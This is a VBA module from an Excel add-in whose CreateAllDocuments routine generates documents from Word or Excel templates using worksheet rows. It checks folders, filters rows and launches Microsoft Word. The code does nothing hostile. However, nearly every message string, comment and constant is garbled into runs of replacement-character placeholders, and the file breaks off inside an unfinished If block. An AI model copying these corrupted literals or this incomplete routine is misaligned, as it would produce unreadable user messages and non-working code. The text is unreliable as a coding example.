Public Const HYPERLINK_START$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - "
Public SelectedTemplates As Collection, SelectedRowsCount&        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
Public CombineXLScollection As Collection, SourceSheet As Worksheet

Function SETT() As AddinSettings
    Static objSETT As AddinSettings
    If objSETT Is Nothing Then Set objSETT = New AddinSettings: objSETT.LoadAllSettings
    Set SETT = objSETT
End Function

Sub CreateAllDocuments()
    On Error Resume Next
    Dim msg$

    If ActiveWorkbook Is Nothing Then
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.    " & _
               vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        MsgBox msg, vbCritical, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Sub
    End If
    
    Set SourceSheet = ActiveSheet

    If USE_CURRENT_FOLDER Then
        If ActiveWorkbook.Path = "" Then
            msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||6fb| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|," & _
                   vbNewLine & "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel." & vbNewLine & vbNewLine & _
                   "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| Excel |fffd||fffd||fffd||fffd| |fffd|" & ActiveWorkbook.Name & "|fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            ShowSettingsPage
            Exit Sub
        End If
    End If

    StopMacro = False
    If Dir(TEMPLATES_FOLDER$, vbDirectory) = "" Then
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.    " & _
               vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & TEMPLATES_FOLDER$
        MsgBox msg, vbCritical, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Debug.Print "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        Exit Sub
    End If

    If USE_CURRENT_FOLDER Then
        MkDir OUTPUT_FOLDER$
        Err.Clear
        If Dir(OUTPUT_FOLDER$, vbDirectory) = "" Then
            msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.    " & _
                   vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & OUTPUT_FOLDER$
            MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
            ShowSettingsPage
            Exit Sub
        End If
    End If


    Dim TemplatesFilenames As Collection, item As Variant, filename$
    Set TemplatesFilenames = FilenamesCollection(TEMPLATES_FOLDER$)

    If SETT.GetBoolean("CheckBox_USE_TEMPLATES_WITH_NAMES_LIKE_WORKSHEET_NAME") Then
        Dim NewColl As New Collection, shname$
        shname$ = ActiveSheet.Name

        For Each item In TemplatesFilenames
            filename$ = "": filename$ = Dir(item)
            filename$ = Left(filename$, InStrRev(filename$, ".") - 1)
            If shname$ Like "*" & filename$ & "*" Then NewColl.Add item
        Next

        If NewColl.Count = 0 Then
            msg = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & vbNewLine & _
                  "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel|fffd|" & vbNewLine & vbNewLine & _
                  "|fffd||fffd||fffd||fffd||fffd| " & TemplatesFilenames.Count & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & TEMPLATES_FOLDER$ & "|fffd|" & vbNewLine & _
                  "|fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & vbNewLine & _
                  "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & shname$ & "|fffd|"

            MsgBox msg, vbExclamation, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"

            ShowSettingsPage
            Exit Sub
        End If
        Set TemplatesFilenames = NewColl

    End If
    If Not CheckTemplateFiles(TemplatesFilenames) Then Exit Sub        ' |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|...

    Dim ra As Range, ro As Range, cell As Range, newRa As Range, BaseCol&, rc&
    BaseCol& = SETT.GetNumber("ComboBox_BaseColumn", 2): If BaseCol& <= 0 Or BaseCol& >= 256 Then BaseCol& = 2

    Set ra = Range(Cells(HEADER_ROW + 1, BaseCol&), Cells(Rows.Count, BaseCol&).End(xlUp))
    If ra.Row < HEADER_ROW + 1 Then
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & BaseCol& & vbNewLine & _
               "(|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
               "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
               "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        MsgBox msg, vbExclamation, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        F_Settings.MultiPage_Options.Value = 2
        F_Settings.Label_BaseColumn.Font.Bold = True
        F_Settings.Label_BaseColumn.ForeColor = vbRed
        F_Settings.ComboBox_BaseColumn.SetFocus
        Exit Sub
    End If

    For Each cell In ra.Cells
        If Trim(cell) <> "" Then
            If newRa Is Nothing Then Set newRa = cell Else Set newRa = Union(newRa, cell)
        End If
    Next
    If newRa Is Nothing Then
        If SETT.GetBoolean("CheckBox_UseAllRows") Then
            msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)|fffd|" & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & BaseCol& & vbNewLine & _
                   "(|fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
                   "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                   "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        Else
            msg$ = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & BaseCol& & vbNewLine & _
                   "(|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
                   "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                   "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        End If
        MsgBox msg, vbExclamation, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        ShowSettingsPage
        F_Settings.MultiPage_Options.Value = 2
        F_Settings.ComboBox_BaseColumn.SetFocus
        Exit Sub
    Else
        Set ra = newRa.EntireRow
    End If

    If Not SETT.GetBoolean("CheckBox_UseAllRows") Then
        Set ra = Intersect(Selection.EntireRow, Selection.EntireRow, ra.EntireRow)
    End If


    Err.Clear
    Set ra = SpecialCells_VisibleRows(ra).EntireRow
    If ra Is Nothing Then
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
             " -   |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & HEADER_ROW & "," & vbNewLine & _
             " -   |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ColunmNameByColumnNumber(BaseCol&) & _
             " |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
               "(|fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        MsgBox msg, vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Sub
    End If
    'If ra Is Nothing Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|!", vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd|": End

    Set ra = Intersect(ra.EntireRow, ra.EntireRow)
    rc& = Intersect(Columns(1), ra).Cells.Count

    If SETT.GetBoolean("CheckBox_SelectTemplates") Then
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Set SelectedTemplates = TemplatesFilenames
        SelectedRowsCount& = rc&
        F_Templates.Show
        If SelectedTemplates.Count = 0 Then Exit Sub
        Set TemplatesFilenames = SelectedTemplates
    End If

    Set ExcelTablesToBeClosed = New Collection
    Application.ScreenUpdating = False
    Set CombineXLScollection = New Collection
    Dim pi2 As ProgressIndicator, res As Boolean, template$
    Set Main_PI = New ProgressIndicator
    Main_PI.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , 3

    Main_PI.StartNewAction 2, 4, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Microsoft Word ..."        ' , , , rc&

    Dim NeedWord As Boolean, WordAlreadyOpen As Boolean
    For Each item In TemplatesFilenames
        NeedWord = NeedWord Or (TemplateType(item) Like "DOC*")
    Next

    If NeedWord Then
        Set WA = GetObject(, "Word.Application")
        If WA Is Nothing Then Set WA = CreateObject("Word.Application") Else WordAlreadyOpen = True
        If WA Is Nothing Then
            msg$ = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Microsoft Word," & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                   "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, Microsoft Word |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
